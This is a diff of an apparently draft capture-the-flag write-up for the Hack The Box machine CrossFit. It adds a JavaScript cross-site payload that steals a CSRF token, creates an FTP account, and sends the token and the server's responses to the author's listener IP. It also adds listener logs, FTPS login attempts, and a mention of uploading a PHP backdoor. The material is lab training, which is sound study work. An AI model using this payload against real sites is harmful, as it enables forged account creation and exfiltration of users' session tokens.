@@ -481,9 +481,102 @@ I modified my script to return only the hidden token.  At first I tried just rea
 
 I received the reply back, this time with only the hidden token.
 
+```javascript
+//send user creation request to /accounts
+//
+//Get the response from /accounts/create with the _token
+var test = "http://ftp.crossfit.htb/accounts/create";
+var request1 = new XMLHttpRequest();
+request1.open('GET', test, false);
+request1.send()
+var response1 = request1.responseText;
 
+//var token = response1.getElementsByName('_token')[0].value;
+var parser = new DOMParser();
+var response_text = parser.parseFromString(response1, "text/html");
+var token = response_text.getElementsByName('_token')[0].value;
+
+var values = "username=test&pass=test&_token=" + token;
+
+var request2 = new XMLHttpRequest();
+//send request to my waiting python http.server for troubleshooting
+request2.open('POST', 'http://10.10.14.161:8090/' + values, true);
+request2.withCredentials = true;
+request2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+request2.send();
+
+var request3 = new XMLHttpRequest();
+//send _token, username, password  to /accounts 
+var values = "username=test&pass=test&_token=" + token;
+request3.open('POST', 'http://ftp.crossfit.htb/accounts', false);
+request3.withCredentials = true;
+request3.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+request3.send(values);
+var response3 = request3.responseText;
+
+var request4 = new XMLHttpRequest();
+//send request to my waiting python http.server with reply from account creation
+request4.open('GET', 'http://10.10.14.161:8090/' + response3, true);
+request4.send();
+```
 
 wrote payload to create new ftp user
+
+```text
+10.10.10.208 - - [21/Mar/2021 21:12:25] "GET /test3.js HTTP/1.1" 200 -
+10.10.10.208 - - [21/Mar/2021 21:12:26] code 501, message Unsupported method ('POST')
+10.10.10.208 - - [21/Mar/2021 21:12:26] "POST /username=test&pass=test&_token=On4dM6BoQTHUTV4aRTi16SlPIxnTcea41HksabOd HTTP/1.1" 501 -
+10.10.10.208 - - [21/Mar/2021 21:43:40] code 404, message File not found
+10.10.10.208 - - [21/Mar/2021 21:43:40] "GET /%3C!DOCTYPE%20html%3E%3Chtml%20lang=%22en%22%3E%20%20%20%20%3Chead%3E%20%20%20%20%20%20%20%20%3Cmeta%20charset=%22utf-8%22%3E%20%20%20%20%20%20%20%20%3Cmeta%20name=%22viewport%22%20content=%22width=device-width,%20initial-scale=1%22%3E%20%20%20%20%20%20%20%20%3Ctitle%3EPage%20Expired%3C/title%3E%20%20%20%20%20%20%20%20%3C!--%20Fonts%20--%3E%20%20%20%20%20%20%20%20%3Clink%20rel=%22dns-prefetch%22%20href=%22//fonts.gstatic.com%22%3E%20%20%20%20%20%20%20%20%3Clink%20href=%22https://fonts.googleapis.com/css?family=Nunito%22%20rel=%22stylesheet%22%3E%20%20%20%20%20%20%20%20%3C!--%20Styles%20--%3E%20%20%20%20%20%20%20%20%3Cstyle%3E%20%20%20%20%20%20%20%20%20%20%20%20html,%20body%20{%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20background-color:%20 HTTP/1.1" 404 -
+```
+
+Got a response on my server
+
+```markup
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <meta name="robots" content="noindex,nofollow,noarchive" />
+    <title>An Error Occurred: Method Not Allowed</title>
+    <style>body { background-color: 
+
+```
+
+I'm not sure what happened, but this time I only got back a partial response.  It was enough to see that I was getting a "Method Not Allowed" error, which was strange.  The site said POST in the code, and I sent a POST.  I decided to see if I could log in despite the error.
+
+### Port 21 - FTP \(with LFTP\)
+
+```text
+┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+└─$ ftp crossfit.htb
+Connected to crossfit.htb.
+220 Cross Fit Ltd. FTP Server
+Name (crossfit.htb:zweilos): test
+530 Non-anonymous sessions must use encryption.
+Login failed.
+421 Service not available, remote server has closed connection
+```
+
+I tried logging in with FTP, but got an error `530 Non-anonymous sessions must use encryption.`
+
+* [https://unix.stackexchange.com/questions/71525/how-do-i-use-implicit-ftp-over-tls](https://unix.stackexchange.com/questions/71525/how-do-i-use-implicit-ftp-over-tls)
+* [https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line](https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line)
+
+> ```text
+> $ lftp
+> lftp :~> set ftp:ssl-force true
+> lftp :~> connect ftp.domain.tld
+> lftp ftp.domain.tld:~> login <username>
+> ```
+>
+> **NOTE:** If the server is making use of self signed certificates you may need to add this `set` as well:
+>
+> ```text
+> lftp :~> set ssl:verify-certificate no
+> ```
+
+
 
 can PUT files, upload php backdoor
 
@@ -981,33 +1074,9 @@ Login failed.
 
 I tried to login to ftp using these credentials, but got an error stating that I needed to use encryption for non-anonymous sessions. I can't use SFTP since SSH is denied for this user, so I must need to use FTPS
 
-[https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line](https://superuser.com/questions/623236/simple-command-to-connect-to-ftps-server-on-linux-command-line)
 
-This post on stack overflow shows how to connect using `lftp`
-
-```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ lftp -u ftpadm 10.10.10.208
-Password: 
-lftp ftpadm@10.10.10.208:~> ls                   
-ls: Fatal error: Certificate verification: Not trusted (25:EC:D2:FE:6C:9D:77:04:EC:7D:D7:92:87:67:4B:C3:8D:0E:CB:CE)
-lftp ftpadm@10.10.10.208:~> 
-exit
-```
 
 [https://serverfault.com/questions/411970/how-to-avoid-lftp-certificate-verification-error](https://serverfault.com/questions/411970/how-to-avoid-lftp-certificate-verification-error)
-
-```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ lftp -u ftpadm 10.10.10.208 -e "set ftp:ssl-allow no" 
-Password: 
-lftp ftpadm@10.10.10.208:~> ls                   
-ls: Login failed: 530 Non-anonymous sessions must use encryption.
-lftp ftpadm@10.10.10.208:~> 
-exit
-```
-
-So that parameter disabled encryption completely...
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
